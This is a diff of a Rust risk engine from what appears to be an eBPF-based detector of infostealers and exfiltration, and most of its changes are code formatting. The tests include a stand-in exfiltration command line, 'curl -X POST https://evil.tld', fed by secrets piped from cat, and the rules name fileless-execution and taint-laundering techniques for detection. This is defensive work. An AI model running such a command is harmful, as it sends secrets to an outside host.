@@ -6,13 +6,13 @@
 use std::net::IpAddr;
 use tracing::debug;
 
+use super::evidence::{AttackStage, EvidenceAggregator};
+use super::explanation::RiskAssessment;
+use crate::lineage::inspect_interpreter;
+use crate::pkg_check::DpkgChecker;
 use sentinel_common::config::RulesConfig;
 use sentinel_common::process::ProcessNode;
 use sentinel_common::risk::{RiskScore, RuleFiring, RuleId};
-use crate::lineage::inspect_interpreter;
-use crate::pkg_check::DpkgChecker;
-use super::evidence::{AttackStage, EvidenceAggregator};
-use super::explanation::RiskAssessment;
 
 /// Context of the network connection event being evaluated.
 #[derive(Debug, Clone)]
@@ -66,15 +66,14 @@ impl RiskEngine {
             && !net.dest_ip.as_deref().unwrap_or("").starts_with("::1");
 
         let has_secret = node.has_secret_access();
-        let confirmed_propagation = node.taint_level == sentinel_common::process::TaintLevel::ConfirmedPropagation
+        let confirmed_propagation = node.taint_level
+            == sentinel_common::process::TaintLevel::ConfirmedPropagation
             || (has_secret && is_exfil && !node.is_interactive_shell);
 
         let confidence = if confirmed_propagation && is_exfil {
             sentinel_common::risk::Confidence::Certain
         } else if node.taint_level == sentinel_common::process::TaintLevel::SuspectedPropagation {
             sentinel_common::risk::Confidence::Medium
-        } else if has_secret && !is_exfil {
-            sentinel_common::risk::Confidence::Low
         } else {
             sentinel_common::risk::Confidence::Low
         };
@@ -120,7 +119,8 @@ impl RiskEngine {
             firings.push(RuleFiring {
                 rule_id: RuleId::FilelessMemfd,
                 weight,
-                reason: "Бесфайловое исполнение кода из оперативной памяти (memfd_create)".to_string(),
+                reason: "Бесфайловое исполнение кода из оперативной памяти (memfd_create)"
+                    .to_string(),
             });
         }
 
@@ -142,13 +142,15 @@ impl RiskEngine {
 
         for secret in &node.secret_accesses {
             let secret_path_str = secret.path.to_string_lossy();
-            let is_domain_match = sentinel_ebpf::maps::TaintHygiene::is_secret_owner(&exe_name, &secret_path_str);
+            let is_domain_match =
+                sentinel_ebpf::maps::TaintHygiene::is_secret_owner(&exe_name, &secret_path_str);
             let is_legitimate_owner = is_domain_match
                 && node.is_system_path()
                 && !node.is_untrusted_origin()
                 && node.ancestor_script.is_none()
                 && (node.pkg_origin.is_some()
-                    || (node.baseline_profile & sentinel_common::process::PROFILE_TRUSTED_PKG != 0))
+                    || (node.baseline_profile & sentinel_common::process::PROFILE_TRUSTED_PKG
+                        != 0))
                 && !node.is_memfd
                 && !node.is_anon_exec;
 
@@ -213,7 +215,9 @@ impl RiskEngine {
         }
 
         // 4. [+25] UNTRUSTED_BINARY_ORIGIN
-        let target_path = node.script_path.as_deref()
+        let target_path = node
+            .script_path
+            .as_deref()
             .or(node.ancestor_script.as_deref())
             .unwrap_or(&node.exe_path);
         let path_str = target_path.to_string_lossy();
@@ -223,7 +227,10 @@ impl RiskEngine {
             || path_str.starts_with("/var/tmp");
 
         let dpkg_info = self.dpkg_checker.check_package(&node.exe_path);
-        let is_verified_package = dpkg_info.as_ref().map(|info| info.is_integrity_verified).unwrap_or(false);
+        let is_verified_package = dpkg_info
+            .as_ref()
+            .map(|info| info.is_integrity_verified)
+            .unwrap_or(false);
 
         if is_untrusted_dir || (!is_verified_package && !node.is_interpreter()) {
             let weight = self.get_weight(RuleId::UntrustedBinaryOrigin.as_str(), 25);
@@ -241,7 +248,8 @@ impl RiskEngine {
                 firings.push(RuleFiring {
                     rule_id: RuleId::SuspiciousInterpreter,
                     weight,
-                    reason: "Интерпретатор запущен с inline-кодом, eval, base64 или через pipe".to_string(),
+                    reason: "Интерпретатор запущен с inline-кодом, eval, base64 или через pipe"
+                        .to_string(),
                 });
             }
 
@@ -263,19 +271,27 @@ impl RiskEngine {
                 firings.push(RuleFiring {
                     rule_id: RuleId::FirstSeenDestination,
                     weight,
-                    reason: format!("Первое в истории процесса подключение к внешнему публичному IP: {}", ip),
+                    reason: format!(
+                        "Первое в истории процесса подключение к внешнему публичному IP: {}",
+                        ip
+                    ),
                 });
             }
         }
 
         // 7. [+10] RAW_IP_CONNECT (Direct IP connection without DNS query)
-        let is_direct_ip = net.dest_ip.as_ref().map(|ip| is_numeric_ip(ip)).unwrap_or(false);
+        let is_direct_ip = net
+            .dest_ip
+            .as_ref()
+            .map(|ip| is_numeric_ip(ip))
+            .unwrap_or(false);
         if is_direct_ip && !net.has_dns_record {
             let weight = self.get_weight(RuleId::RawIpConnect.as_str(), 10);
             firings.push(RuleFiring {
                 rule_id: RuleId::RawIpConnect,
                 weight,
-                reason: "Сетевое подключение напрямую по IP без зафиксированного DNS-запроса".to_string(),
+                reason: "Сетевое подключение напрямую по IP без зафиксированного DNS-запроса"
+                    .to_string(),
             });
         }
 
@@ -295,13 +311,24 @@ impl RiskEngine {
             firings.push(RuleFiring {
                 rule_id: RuleId::IpcTaintLaunder,
                 weight,
-                reason: "Попытка отмывания taint через AF_UNIX сокет или перехват памяти ptrace".to_string(),
+                reason: "Попытка отмывания taint через AF_UNIX сокет или перехват памяти ptrace"
+                    .to_string(),
             });
         }
 
         // 10. [-35] TRUSTED_PACKAGE_CONTEXT
-        let is_script_untrusted = node.script_path.is_some() || node.ancestor_script.is_some() || node.is_memfd || node.is_anon_exec || node.is_interpreter();
-        if is_verified_package && !is_untrusted_dir && !is_script_untrusted && !has_secret && !net.is_tofu_tampered && !net.is_ipc_laundered {
+        let is_script_untrusted = node.script_path.is_some()
+            || node.ancestor_script.is_some()
+            || node.is_memfd
+            || node.is_anon_exec
+            || node.is_interpreter();
+        if is_verified_package
+            && !is_untrusted_dir
+            && !is_script_untrusted
+            && !has_secret
+            && !net.is_tofu_tampered
+            && !net.is_ipc_laundered
+        {
             let weight = self.get_weight(RuleId::TrustedPackageContext.as_str(), -35);
             firings.push(RuleFiring {
                 rule_id: RuleId::TrustedPackageContext,
@@ -311,7 +338,10 @@ impl RiskEngine {
         }
 
         let score = RiskScore::compute(firings);
-        debug!("Risk evaluation for TGID {}: score={}", node.tgid, score.total);
+        debug!(
+            "Risk evaluation for TGID {}: score={}",
+            node.tgid, score.total
+        );
         score
     }
 
@@ -325,8 +355,12 @@ impl RiskEngine {
                 RuleId::FilelessMemfd | RuleId::FilelessAnonExec => AttackStage::DefenseEvasion,
                 RuleId::SecretNonOwner => AttackStage::CredentialAccess,
                 RuleId::CovertDnsTunnel | RuleId::FastExfilBurst => AttackStage::Exfiltration,
-                RuleId::UntrustedBinaryOrigin | RuleId::SuspiciousInterpreter | RuleId::SuspiciousScriptExecution => AttackStage::Execution,
-                RuleId::FirstSeenDestination | RuleId::RawIpConnect => AttackStage::CommandAndControl,
+                RuleId::UntrustedBinaryOrigin
+                | RuleId::SuspiciousInterpreter
+                | RuleId::SuspiciousScriptExecution => AttackStage::Execution,
+                RuleId::FirstSeenDestination | RuleId::RawIpConnect => {
+                    AttackStage::CommandAndControl
+                }
                 RuleId::TofuTamperedBinary => AttackStage::Persistence,
                 RuleId::IpcTaintLaunder => AttackStage::DefenseEvasion,
                 RuleId::TrustedPackageContext => AttackStage::Discovery,
@@ -335,7 +369,11 @@ impl RiskEngine {
         }
 
         let (total_score, evidences) = aggregator.calculate_aggregate();
-        let final_score = if score.firings.iter().any(|f| f.rule_id == RuleId::TrustedPackageContext) {
+        let final_score = if score
+            .firings
+            .iter()
+            .any(|f| f.rule_id == RuleId::TrustedPackageContext)
+        {
             score.total
         } else {
             total_score.max(score.total)
@@ -376,8 +414,8 @@ pub fn is_private_or_loopback_ip(ip_str: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use std::path::PathBuf;
     use sentinel_common::process::SecretCategory;
+    use std::path::PathBuf;
 
     #[test]
     fn test_infostealer_detection() {
@@ -409,11 +447,17 @@ mod tests {
         let score = engine.evaluate(&node, &net);
         assert_eq!(score.total, 100);
         let thresholds = sentinel_common::risk::RiskThresholds::default();
-        assert_eq!(score.classify(&thresholds), sentinel_common::risk::Verdict::High);
+        assert_eq!(
+            score.classify(&thresholds),
+            sentinel_common::risk::Verdict::High
+        );
 
         let assessment = engine.evaluate_assessment(&node, &net);
         assert_eq!(assessment.score, 100);
-        assert_eq!(assessment.severity, sentinel_common::risk::SeverityLevel::Severe);
+        assert_eq!(
+            assessment.severity,
+            sentinel_common::risk::SeverityLevel::Severe
+        );
     }
 
     #[test]
@@ -424,7 +468,12 @@ mod tests {
 
         // System curl binary (in /usr/bin/curl)
         let mut node = ProcessNode::new(2500, 1000, 1000, PathBuf::from("/usr/bin/curl"));
-        node.cmdline = vec!["curl".into(), "-X".into(), "POST".into(), "https://evil.tld".into()];
+        node.cmdline = vec![
+            "curl".into(),
+            "-X".into(),
+            "POST".into(),
+            "https://evil.tld".into(),
+        ];
 
         // Inherited taint through cat secret | curl pipe
         node.record_secret_access(
@@ -450,8 +499,14 @@ mod tests {
         // TRUSTED_PACKAGE_CONTEXT (-35) MUST NOT FIRE!
         // Final score must be at least 40 (GREY)
         assert!(score.total >= 40);
-        assert!(!score.firings.iter().any(|f| f.rule_id == RuleId::TrustedPackageContext));
-        assert_eq!(score.classify(&sentinel_common::risk::RiskThresholds::default()), sentinel_common::risk::Verdict::Grey);
+        assert!(!score
+            .firings
+            .iter()
+            .any(|f| f.rule_id == RuleId::TrustedPackageContext));
+        assert_eq!(
+            score.classify(&sentinel_common::risk::RiskThresholds::default()),
+            sentinel_common::risk::Verdict::Grey
+        );
     }
 
     #[test]
@@ -460,7 +515,12 @@ mod tests {
         let dpkg = DpkgChecker::new();
         let engine = RiskEngine::new(rules, dpkg);
 
-        let node = ProcessNode::new(3100, 1000, 1000, PathBuf::from("/home/user/.cargo/bin/tampered_tool"));
+        let node = ProcessNode::new(
+            3100,
+            1000,
+            1000,
+            PathBuf::from("/home/user/.cargo/bin/tampered_tool"),
+        );
 
         let net = NetworkContext {
             dest_ip: Some("198.51.100.1".into()),
@@ -474,7 +534,10 @@ mod tests {
         };
 
         let score = engine.evaluate(&node, &net);
-        assert!(score.firings.iter().any(|f| f.rule_id == RuleId::TofuTamperedBinary));
+        assert!(score
+            .firings
+            .iter()
+            .any(|f| f.rule_id == RuleId::TofuTamperedBinary));
         assert!(score.total >= 40);
     }
 }
